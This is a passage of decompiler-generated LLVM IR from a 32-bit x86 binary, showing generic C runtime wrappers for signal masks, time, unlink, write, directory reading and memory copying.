  %v0_804ff42 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ff42 = sub i32 0, %v0_804ff42
  %v2_804ff44 = inttoptr i32 %v1_804ff3d to i32*
  store i32 %v1_804ff42, i32* %v2_804ff44, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804ff4d.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804ff49

dec_label_pc_804ff49:                             ; preds = %dec_label_pc_804ff29, %dec_label_pc_804ff3d
  %v2_804ff4d = phi i32 [ %v0_804ff29, %dec_label_pc_804ff29 ], [ %v2_804ff4d.pre, %dec_label_pc_804ff3d ]
  %v0_804ff49 = phi i32 [ %v1_804ff32, %dec_label_pc_804ff29 ], [ -1, %dec_label_pc_804ff3d ]
  store i32 %v2_804ff4d, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804ff49

; uselistorder directives
  uselistorder i32 %v1_804ff32, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ff49, { 1, 0 }
}

define i32 @function_804ff4f(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804ff4f:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804ff50 = load i32, i32* @esi, align 4
  %v4_804ff54 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804ff54, i32* @ecx, align 4
  %v2_804ff60 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  %tmp11 = icmp ult i32 %arg1, 3
  %or.cond = or i1 %tmp11, %v2_804ff60
  br i1 %or.cond, label %dec_label_pc_804ff79, label %dec_label_pc_804ff69

dec_label_pc_804ff69:                             ; preds = %dec_label_pc_804ff4f
  %v1_804ff69 = call i32 @function_805021b(i32 %v0_804ff50)
  %v1_804ff6e = inttoptr i32 %v1_804ff69 to i32*
  store i32 22, i32* %v1_804ff6e, align 4
  br label %dec_label_pc_804ffa0

dec_label_pc_804ff79:                             ; preds = %dec_label_pc_804ff4f
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804ff7e = load i32, i32* @ebx, align 4
  %v7_804ff86 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_804ff7e, i32* @ebx, align 4
  store i32 %v7_804ff86, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_804ff86, -4095
  br i1 %tmp12, label %dec_label_pc_804ffa0, label %dec_label_pc_804ff92

dec_label_pc_804ff92:                             ; preds = %dec_label_pc_804ff79
  %v1_804ff92 = call i32 @function_805021b(i32 %v0_804ff7e)
  %v0_804ff97 = load i32, i32* %esi.global-to-local, align 4
  %v1_804ff97 = sub i32 0, %v0_804ff97
  %v2_804ff99 = inttoptr i32 %v1_804ff92 to i32*
  store i32 %v1_804ff97, i32* %v2_804ff99, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804ffa0

dec_label_pc_804ffa0:                             ; preds = %dec_label_pc_804ff92, %dec_label_pc_804ff79, %dec_label_pc_804ff69
  %storemerge = phi i32 [ -1, %dec_label_pc_804ff69 ], [ %v7_804ff86, %dec_label_pc_804ff79 ], [ -1, %dec_label_pc_804ff92 ]
  %v2_804ffa0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804ffa0, i32* @edx, align 4
  store i32 %v0_804ff50, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_804ff86, { 1, 0, 2 }
  uselistorder i32 %v0_804ff7e, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_804ffa4() local_unnamed_addr {
dec_label_pc_804ffa4:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804ffa4 = load i32, i32* @edi, align 4
  store i32 %v0_804ffa4, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v0_804ffac = load i32, i32* @ebx, align 4
  %v1_804ffb4 = inttoptr i32 %tmp to i32*
  %v2_804ffb4 = call i32 @time(i32* %v1_804ffb4)
  store i32 %v0_804ffac, i32* @ebx, align 4
  store i32 %v2_804ffb4, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_804ffb4, -4095
  br i1 %tmp9, label %dec_label_pc_804ffcc, label %dec_label_pc_804ffc0

dec_label_pc_804ffc0:                             ; preds = %dec_label_pc_804ffa4
  %v1_804ffc0 = call i32 @function_805021b(i32 %v0_804ffac)
  %v0_804ffc5 = load i32, i32* %edi.global-to-local, align 4
  %v1_804ffc5 = sub i32 0, %v0_804ffc5
  %v2_804ffc7 = inttoptr i32 %v1_804ffc0 to i32*
  store i32 %v1_804ffc5, i32* %v2_804ffc7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804ffd0.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804ffcc

dec_label_pc_804ffcc:                             ; preds = %dec_label_pc_804ffa4, %dec_label_pc_804ffc0
  %v2_804ffd0 = phi i32 [ %v0_804ffa4, %dec_label_pc_804ffa4 ], [ %v2_804ffd0.pre, %dec_label_pc_804ffc0 ]
  %v0_804ffcc = phi i32 [ %v2_804ffb4, %dec_label_pc_804ffa4 ], [ -1, %dec_label_pc_804ffc0 ]
  store i32 %v2_804ffd0, i32* %edi.global-to-local, align 4
  ret i32 %v0_804ffcc

; uselistorder directives
  uselistorder i32 %v2_804ffb4, { 1, 0, 2 }
  uselistorder i32 %v0_804ffac, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_804ffcc, { 1, 0 }
}

define i32 @function_804ffd2(i8* %arg1) local_unnamed_addr {
dec_label_pc_804ffd2:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ffd2 = load i32, i32* @edi, align 4
  store i32 %v0_804ffd2, i32* %stack_var_-4, align 4
  %v4_804ffd6 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804ffd6, i32* %edi.global-to-local, align 4
  %v0_804ffda = load i32, i32* @ebx, align 4
  %v3_804ffe2 = call i32 @unlink(i8* %arg1)
  store i32 %v3_804ffe2, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_804ffe2, -4095
  br i1 %tmp9, label %dec_label_pc_804fffa, label %dec_label_pc_804ffee

dec_label_pc_804ffee:                             ; preds = %dec_label_pc_804ffd2
  %v1_804ffee = call i32 @function_805021b(i32 %v0_804ffda)
  %v0_804fff3 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fff3 = sub i32 0, %v0_804fff3
  %v2_804fff5 = inttoptr i32 %v1_804ffee to i32*
  store i32 %v1_804fff3, i32* %v2_804fff5, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fffe.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fffa

dec_label_pc_804fffa:                             ; preds = %dec_label_pc_804ffd2, %dec_label_pc_804ffee
  %v2_804fffe = phi i32 [ %v0_804ffd2, %dec_label_pc_804ffd2 ], [ %v2_804fffe.pre, %dec_label_pc_804ffee ]
  %v0_804fffa = phi i32 [ %v3_804ffe2, %dec_label_pc_804ffd2 ], [ -1, %dec_label_pc_804ffee ]
  store i32 %v2_804fffe, i32* %edi.global-to-local, align 4
  ret i32 %v0_804fffa

; uselistorder directives
  uselistorder i32 %v3_804ffe2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fffa, { 1, 0 }
}

define i32 @function_8050000(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050000:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050000 = load i32, i32* @edi, align 4
  store i32 %v0_8050000, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8050010 = load i32, i32* @ebx, align 4
  %v4_8050018 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_8050018, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_8050018, -4095
  br i1 %tmp12, label %dec_label_pc_8050030, label %dec_label_pc_8050024

dec_label_pc_8050024:                             ; preds = %dec_label_pc_8050000
  %v1_8050024 = call i32 @function_805021b(i32 %v0_8050010)
  %v0_8050029 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050029 = sub i32 0, %v0_8050029
  %v2_805002b = inttoptr i32 %v1_8050024 to i32*
  store i32 %v1_8050029, i32* %v2_805002b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8050034.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8050030

dec_label_pc_8050030:                             ; preds = %dec_label_pc_8050000, %dec_label_pc_8050024
  %v2_8050034 = phi i32 [ %v0_8050000, %dec_label_pc_8050000 ], [ %v2_8050034.pre, %dec_label_pc_8050024 ]
  %v0_8050030 = phi i32 [ %v4_8050018, %dec_label_pc_8050000 ], [ -1, %dec_label_pc_8050024 ]
  store i32 %v2_8050034, i32* %edi.global-to-local, align 4
  ret i32 %v0_8050030

; uselistorder directives
  uselistorder i32 %v4_8050018, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050030, { 1, 0 }
}

define i32 @function_8050036(i32* %arg1) local_unnamed_addr {
dec_label_pc_8050036:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v0_8050038 = load i32, i32* @ebx, align 4
  %v12_8050039 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp3, i32* @edi, align 4
  %v2_8050040 = load i32, i32* %arg1, align 4
  %v12_8050040 = icmp eq i32 %v2_8050040, -1
  %v1_8050043 = icmp eq i1 %v12_8050040, false
  br i1 %v1_8050043, label %dec_label_pc_8050055, label %dec_label_pc_8050045

dec_label_pc_8050045:                             ; preds = %dec_label_pc_8050036
  %v1_8050045 = call i32 @function_805021b(i32 %v0_8050038)
  %v1_805004a = inttoptr i32 %v1_8050045 to i32*
  store i32 9, i32* %v1_805004a, align 4
  br label %dec_label_pc_805009f

dec_label_pc_8050055:                             ; preds = %dec_label_pc_8050036
  %v1_8050055 = add i32 %tmp3, 24
  store i32 %v12_8050039, i32* @esi, align 4
  %v2_8050064 = call i32 @function_8051ba5(i32 %v12_8050039, i32 134552482)
  %v1_805006c = call i32 @function_8051ba2(i32 %v1_8050055)
  store i32 %v1_805006c, i32* @eax, align 4
  %v0_8050071 = load i32, i32* @edi, align 4
  %v1_8050071 = inttoptr i32 %v0_8050071 to i32*
  %v2_8050071 = load i32, i32* %v1_8050071, align 4
  store i32 %v2_8050071, i32* @ebx, align 4
  store i32 -1, i32* %v1_8050071, align 4
  %v2_805007e = call i32 @function_8051ba5(i32 %v12_8050039, i32 1)
  %v0_8050084 = load i32, i32* @edi, align 4
  %v1_8050084 = add i32 %v0_8050084, 12
  %v2_8050084 = inttoptr i32 %v1_8050084 to i32*
  %v3_8050084 = load i32, i32* %v2_8050084, align 4
  %v1_8050087 = call i32 @function_805143e(i32 %v3_8050084)
  %v0_805008c = load i32, i32* @edi, align 4
  %v1_805008f = call i32 @function_805143e(i32 %v0_805008c)
  %v0_8050094 = load i32, i32* @ebx, align 4
  %v1_8050097 = call i32 @function_804fce3(i32 %v0_8050094)
  br label %dec_label_pc_805009f

dec_label_pc_805009f:                             ; preds = %dec_label_pc_8050045, %dec_label_pc_8050055
  %v0_80500a5 = phi i32 [ -1, %dec_label_pc_8050045 ], [ %v1_8050097, %dec_label_pc_8050055 ]
  ret i32 %v0_80500a5

; uselistorder directives
  uselistorder label %dec_label_pc_805009f, { 1, 0 }
}

define i32 @function_80500a6(i32 %arg1) local_unnamed_addr {
dec_label_pc_80500a6:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-124, align 4
  %v2_80500b7 = inttoptr i32 %arg1 to i8*
  %v3_80500b7 = call i32 @function_804fdf4(i8* %v2_80500b7, i32 67584)
  store i32 %v3_80500b7, i32* %eax.global-to-local, align 4
  store i32 %v3_80500b7, i32* @edi, align 4
  %v2_80500c1 = icmp slt i32 %v3_80500b7, 0
  br i1 %v2_80500c1, label %dec_label_pc_805018e, label %dec_label_pc_80500c9

dec_label_pc_80500c9:                             ; preds = %dec_label_pc_80500a6
  %v0_80500c9 = load i32, i32* @ebx, align 4
  %v2_80500cb = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v2_80500cb, i32* %eax.global-to-local, align 4
  store i32 %v3_80500b7, i32* %stack_var_-124, align 4
  %v4_80500d1 = call i32 @function_8051f9e(i32 %v3_80500b7, i32 %v2_80500cb, i32 %v0_80500c9, i32 %v0_80500c9)
  store i32 %v4_80500d1, i32* %eax.global-to-local, align 4
  %v2_80500d9 = icmp slt i32 %v4_80500d1, 0
  br i1 %v2_80500d9, label %dec_label_pc_80500ef, label %dec_label_pc_80500dd

dec_label_pc_80500dd:                             ; preds = %dec_label_pc_80500c9
  %v0_80500e2 = load i32, i32* @edi, align 4
  store i32 %v0_80500e2, i32* %stack_var_-124, align 4
  %v3_80500e3 = call i32 @function_804fc4d(i32 %v0_80500e2, i32 2, i32 1)
  store i32 %v3_80500e3, i32* %eax.global-to-local, align 4
  %v2_80500eb = icmp slt i32 %v3_80500e3, 0
  %v1_80500ed = icmp eq i1 %v2_80500eb, false
  br i1 %v1_80500ed, label %dec_label_pc_8050105, label %dec_label_pc_80500ef

dec_label_pc_80500ef:                             ; preds = %dec_label_pc_80500dd, %dec_label_pc_80500c9
  %v0_80500ef = load i32, i32* %stack_var_-124, align 4
  %v1_80500ef = call i32 @function_805021b(i32 %v0_80500ef)
  store i32 %v1_80500ef, i32* %eax.global-to-local, align 4
  store i32 %v1_80500ef, i32* @ebx, align 4
  %v1_80500f9 = inttoptr i32 %v1_80500ef to i32*
  %v2_80500f9 = load i32, i32* %v1_80500f9, align 4
  %v0_80500fb = load i32, i32* @edi, align 4
  store i32 %v0_80500fb, i32* %stack_var_-124, align 4
  %v1_80500fc = call i32 @function_804fce3(i32 %v0_80500fb)
  store i32 %v1_80500fc, i32* %eax.global-to-local, align 4
  %v1_8050101 = load i32, i32* @ebx, align 4
  %v2_8050101 = inttoptr i32 %v1_8050101 to i32*
  store i32 %v2_80500f9, i32* %v2_8050101, align 4
  br label %dec_label_pc_805017a

dec_label_pc_8050105:                             ; preds = %dec_label_pc_80500dd
  store i32 48, i32* %stack_var_-124, align 4
  %v1_805010a = call i32 @function_8050679(i32 48)
  store i32 %v1_805010a, i32* %eax.global-to-local, align 4
  store i32 %v1_805010a, i32* @ebx, align 4
  %v1_8050114 = icmp eq i32 %v1_805010a, 0
  br i1 %v1_8050114, label %dec_label_pc_8050166, label %dec_label_pc_8050118

dec_label_pc_8050118:                             ; preds = %dec_label_pc_8050105
  %v0_8050118 = load i32, i32* @edi, align 4
  %v2_8050118 = inttoptr i32 %v1_805010a to i32*
  store i32 %v0_8050118, i32* %v2_8050118, align 4
  %v1_805011a = add i32 %v1_805010a, 16
  %v2_805011a = inttoptr i32 %v1_805011a to i32*
  store i32 0, i32* %v2_805011a, align 4
  %v1_8050121 = add i32 %v1_805010a, 8
  %v2_8050121 = inttoptr i32 %v1_8050121 to i32*
  store i32 0, i32* %v2_8050121, align 4
  %v1_8050128 = add i32 %v1_805010a, 4
  %v2_8050128 = inttoptr i32 %v1_8050128 to i32*
  store i32 0, i32* %v2_8050128, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v1_8050133 = load i32, i32* @ebx, align 4
  %v2_8050133 = add i32 %v1_8050133, 20
  %v3_8050133 = inttoptr i32 %v2_8050133 to i32*
  store i32 %tmp, i32* %v3_8050133, align 4
  %v0_8050136 = load i32, i32* %eax.global-to-local, align 4
  %v6_805013b = icmp ugt i32 %v0_8050136, 511
  br i1 %v6_805013b, label %dec_label_pc_8050144, label %dec_label_pc_805013d

dec_label_pc_805013d:                             ; preds = %dec_label_pc_8050118
  %v0_805013d = load i32, i32* @ebx, align 4
  %v1_805013d = add i32 %v0_805013d, 20
  %v2_805013d = inttoptr i32 %v1_805013d to i32*
  store i32 512, i32* %v2_805013d, align 4
  br label %dec_label_pc_8050144

dec_label_pc_8050144:                             ; preds = %dec_label_pc_8050118, %dec_label_pc_805013d
  %v0_8050144 = load i32, i32* @edx, align 4
  %v0_8050146 = load i32, i32* @ebx, align 4
  %v1_8050146 = add i32 %v0_8050146, 20
  %v2_8050146 = inttoptr i32 %v1_8050146 to i32*
  %v3_8050146 = load i32, i32* %v2_8050146, align 4
  store i32 1, i32* %stack_var_-124, align 4
  %v5_805014b = call i32 @function_8050ded(i64 1, i32 %v3_8050146, i32 %v0_8050144, i32 %v0_8050144)
  store i32 %v5_805014b, i32* %eax.global-to-local, align 4
  %v1_8050153 = load i32, i32* @ebx, align 4
  %v2_8050153 = add i32 %v1_8050153, 12
  %v3_8050153 = inttoptr i32 %v2_8050153 to i32*
  store i32 %v5_805014b, i32* %v3_8050153, align 4
  %v1_8050156 = icmp eq i32 %v5_805014b, 0
  %v1_8050158 = icmp eq i1 %v1_8050156, false
  br i1 %v1_8050158, label %dec_label_pc_805017e, label %dec_label_pc_805015a

dec_label_pc_805015a:                             ; preds = %dec_label_pc_8050144
  %v0_805015d = load i32, i32* @ebx, align 4
  store i32 %v0_805015d, i32* %stack_var_-124, align 4
  %v1_805015e = call i32 @function_805143e(i32 %v0_805015d)
  store i32 %v1_805015e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050166

dec_label_pc_8050166:                             ; preds = %dec_label_pc_8050105, %dec_label_pc_805015a
  %v0_8050169 = load i32, i32* @edi, align 4
  store i32 %v0_8050169, i32* %stack_var_-124, align 4
  %v1_805016a = call i32 @function_804fce3(i32 %v0_8050169)
  store i32 %v1_805016a, i32* %eax.global-to-local, align 4
  %v1_805016f = call i32 @function_805021b(i32 %v0_8050169)
  store i32 %v1_805016f, i32* %eax.global-to-local, align 4
  %v1_8050174 = inttoptr i32 %v1_805016f to i32*
  store i32 12, i32* %v1_8050174, align 4
  br label %dec_label_pc_805017a

dec_label_pc_805017a:                             ; preds = %dec_label_pc_80500ef, %dec_label_pc_8050166
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805018b

dec_label_pc_805017e:                             ; preds = %dec_label_pc_8050144
  %v0_8050180 = load i32, i32* @ebx, align 4
  %v1_8050180 = add i32 %v0_8050180, 24
  store i32 %v1_8050180, i32* %eax.global-to-local, align 4
  store i32 %v1_8050180, i32* %stack_var_-124, align 4
  %v1_8050186 = call i32 @function_8051ba2(i32 %v1_8050180)
  store i32 %v1_8050186, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805018b

dec_label_pc_805018b:                             ; preds = %dec_label_pc_805017a, %dec_label_pc_805017e
  br label %dec_label_pc_805018e

dec_label_pc_805018e:                             ; preds = %dec_label_pc_80500a6, %dec_label_pc_805018b
  %v0_8050191 = load i32, i32* @ebx, align 4
  store i32 %v0_8050191, i32* %eax.global-to-local, align 4
  ret i32 %v0_8050191

; uselistorder directives
  uselistorder i32 %v1_805010a, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 %v1_80500ef, { 1, 0, 2 }
  uselistorder i32 %v3_80500b7, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-124, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i32)* @function_804fce3, { 10, 9, 2, 8, 7, 4, 6, 3, 5, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805018e, { 1, 0 }
  uselistorder label %dec_label_pc_805018b, { 1, 0 }
  uselistorder label %dec_label_pc_805017a, { 1, 0 }
  uselistorder label %dec_label_pc_8050166, { 1, 0 }
  uselistorder label %dec_label_pc_8050144, { 1, 0 }
}

define i32 @function_8050197(i32* %arg1) local_unnamed_addr {
dec_label_pc_8050197:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  store i32 %tmp3, i32* @esi, align 4
  %v1_80501a0 = add i32 %tmp3, 24
  store i32 %v1_80501a0, i32* @ebx, align 4
  %v2_80501a9 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80501a9, i32* @eax, align 4
  %v2_80501ae = call i32 @function_8051ba5(i32 %v2_80501a9, i32 134552482)
  %v0_80501b3 = load i32, i32* @ebx, align 4
  %v1_80501b6 = call i32 @function_8051ba2(i32 %v0_80501b3)
  br label %dec_label_pc_80501be

dec_label_pc_80501be:                             ; preds = %dec_label_pc_80501e9, %dec_label_pc_8050197
  %v0_80501be = load i32, i32* @esi, align 4
  %v1_80501be = add i32 %v0_80501be, 8
  %v2_80501be = inttoptr i32 %v1_80501be to i32*
  %v3_80501be = load i32, i32* %v2_80501be, align 4
  %v2_80501c1 = add i32 %v0_80501be, 4
  %v3_80501c1 = inttoptr i32 %v2_80501c1 to i32*
  %v4_80501c1 = load i32, i32* %v3_80501c1, align 4
  %v6_80501c4 = icmp ugt i32 %v3_80501be, %v4_80501c1
  br i1 %v6_80501c4, label %dec_label_pc_80501e9, label %dec_label_pc_80501c6

dec_label_pc_80501c6:                             ; preds = %dec_label_pc_80501be
  %v0_80501c6 = load i32, i32* @edx, align 4
  %v1_80501c7 = add i32 %v0_80501be, 20
  %v2_80501c7 = inttoptr i32 %v1_80501c7 to i32*
  %v3_80501c7 = load i32, i32* %v2_80501c7, align 4
  %v1_80501ca = add i32 %v0_80501be, 12
  %v2_80501ca = inttoptr i32 %v1_80501ca to i32*
  %v3_80501ca = load i32, i32* %v2_80501ca, align 4
  %v1_80501cd = inttoptr i32 %v0_80501be to i32*
  %v2_80501cd = load i32, i32* %v1_80501cd, align 4
  %v4_80501cf = call i32 @function_8051fe6(i32 %v2_80501cd, i32 %v3_80501ca, i32 %v3_80501c7, i32 %v0_80501c6)
  %tmp13 = icmp slt i32 %v4_80501cf, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_80501df, label %dec_label_pc_80501db

dec_label_pc_80501db:                             ; preds = %dec_label_pc_80501c6
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8050205

dec_label_pc_80501df:                             ; preds = %dec_label_pc_80501c6
  %v1_80501df = load i32, i32* @esi, align 4
  %v2_80501df = add i32 %v1_80501df, 8
  %v3_80501df = inttoptr i32 %v2_80501df to i32*
  store i32 %v4_80501cf, i32* %v3_80501df, align 4
  %v0_80501e2 = load i32, i32* @esi, align 4
  %v1_80501e2 = add i32 %v0_80501e2, 4
  %v2_80501e2 = inttoptr i32 %v1_80501e2 to i32*
  store i32 0, i32* %v2_80501e2, align 4
  %v0_80501e9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80501e9

dec_label_pc_80501e9:                             ; preds = %dec_label_pc_80501be, %dec_label_pc_80501df
  %v1_80501f7 = phi i32 [ %v0_80501be, %dec_label_pc_80501be ], [ %v0_80501e9.pre, %dec_label_pc_80501df ]
  %v1_80501e9 = add i32 %v1_80501f7, 4
  %v2_80501e9 = inttoptr i32 %v1_80501e9 to i32*
  %v3_80501e9 = load i32, i32* %v2_80501e9, align 4
  %v2_80501ee = add i32 %v1_80501f7, 12
  %v3_80501ee = inttoptr i32 %v2_80501ee to i32*
  %v4_80501ee = load i32, i32* %v3_80501ee, align 4
  %v5_80501ee = add i32 %v4_80501ee, %v3_80501e9
  store i32 %v5_80501ee, i32* @ebx, align 4
  %v1_80501f1 = add i32 %v5_80501ee, 8
  %v2_80501f1 = inttoptr i32 %v1_80501f1 to i16*
  %v3_80501f1 = load i16, i16* %v2_80501f1, align 2
  %v4_80501f1 = zext i16 %v3_80501f1 to i32
  store i32 %v4_80501f1, i32* @edx, align 4
  %v2_80501f5 = add i32 %v4_80501f1, %v3_80501e9
  store i32 %v2_80501f5, i32* %v2_80501e9, align 4
  %v0_80501fa = load i32, i32* @ebx, align 4
  %v1_80501fa = add i32 %v0_80501fa, 4
  %v2_80501fa = inttoptr i32 %v1_80501fa to i32*
  %v3_80501fa = load i32, i32* %v2_80501fa, align 4
  %v1_80501fd = load i32, i32* @esi, align 4
  %v2_80501fd = add i32 %v1_80501fd, 16
  %v3_80501fd = inttoptr i32 %v2_80501fd to i32*
  store i32 %v3_80501fa, i32* %v3_80501fd, align 4
  %v0_8050200 = load i32, i32* @ebx, align 4
  %v1_8050200 = inttoptr i32 %v0_8050200 to i32*
  %v2_8050200 = load i32, i32* %v1_8050200, align 4
  %v3_8050200 = icmp eq i32 %v2_8050200, 0
  br i1 %v3_8050200, label %dec_label_pc_80501be, label %dec_label_pc_8050205.loopexit

dec_label_pc_8050205.loopexit:                    ; preds = %dec_label_pc_80501e9
  br label %dec_label_pc_8050205

dec_label_pc_8050205:                             ; preds = %dec_label_pc_8050205.loopexit, %dec_label_pc_80501db
  store i32 %v2_80501a9, i32* @eax, align 4
  %v2_805020e = call i32 @function_8051ba5(i32 %v2_80501a9, i32 1)
  %v0_8050213 = load i32, i32* @ebx, align 4
  ret i32 %v0_8050213

; uselistorder directives
  uselistorder i32 %v1_80501f7, { 1, 0 }
  uselistorder i32 %v0_80501be, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder label %dec_label_pc_80501e9, { 1, 0 }
}

define i32 @function_805021b(i32 %arg1) local_unnamed_addr {
dec_label_pc_805021b:
  ret i32 ptrtoint (i32* @global_var_8053154.29 to i32)
}

define i32 @function_8050221() local_unnamed_addr {
dec_label_pc_8050221:
  %tmp = call i64 @__decompiler_undefined_function_6()
  %stack_var_-16 = alloca i32, align 4
  %v1_8050229 = bitcast i32* %stack_var_-16 to %tms*
  %v2_8050229 = call i32 @function_80523bb(%tms* %v1_8050229)
  %v4_805022e = trunc i64 %tmp to i32
  %v4_8050232 = load i32, i32* %stack_var_-16, align 4
  %v5_8050232 = add i32 %v4_8050232, %v4_805022e
  %v3_8050239 = mul i32 %v5_8050232, 10000
  %v1_805023f = and i32 %v3_8050239, 2147483632
  ret i32 %v1_805023f

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_8050245(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050245:
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8050246 = load i32, i32* @esi, align 4
  store i32 %v0_8050246, i32* %stack_var_-8, align 4
  %v4_8050247 = ptrtoint i8* %arg1 to i32
  %v9_8050253 = icmp ugt i8* %tmp3, %arg1
  %v1_8050255 = icmp eq i1 %v9_8050253, false
  br i1 %v1_8050255, label %dec_label_pc_805025d, label %dec_label_pc_8050257

dec_label_pc_8050257:                             ; preds = %dec_label_pc_8050245
  %v7_8050259 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %arg3)
  br label %dec_label_pc_8050269

dec_label_pc_805025d:                             ; preds = %dec_label_pc_8050245
  %v3_805025d = add i32 %arg2, -1
  %v4_805025d = add i32 %v3_805025d, %arg3
  %v5_805025d = inttoptr i32 %v4_805025d to i8*
  %v3_8050261 = add i32 %v4_8050247, -1
  %v4_8050261 = add i32 %v3_8050261, %arg3
  %v5_8050261 = inttoptr i32 %v4_8050261 to i8*
  %v7_8050266 = call i8* @_memcpy(i8* %v5_8050261, i8* %v5_805025d, i32 %arg3)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8050269

dec_label_pc_8050269:                             ; preds = %dec_label_pc_8050257, %dec_label_pc_805025d
  %v2_8050269 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050269, i32* @esi, align 4
  ret i32 %v4_8050247

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050269, { 1, 0 }
}

define i32 @function_805026c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805026c:
  %v0_805026c = load i32, i32* @edi, align 4
  %v4_8050275 = ptrtoint i8* %arg1 to i32
  %v5_8050279 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v0_805026c, i32* @edi, align 4
  ret i32 %v4_8050275

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @function_8050281(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8050281:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8050282 = load i32, i32* @esi, align 4
  store i32 %v0_8050282, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805028a = ptrtoint i8* %arg1 to i32
  store i32 %v4_805028a, i32* %edi.global-to-local, align 4
  %v4_805028e.pre = load i32, i32* @eax, align 4
  %v8_805028e.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_805028e

dec_label_pc_805028e:                             ; preds = %dec_label_pc_805028e.dec_label_pc_805028e_crit_edge, %dec_label_pc_8050281
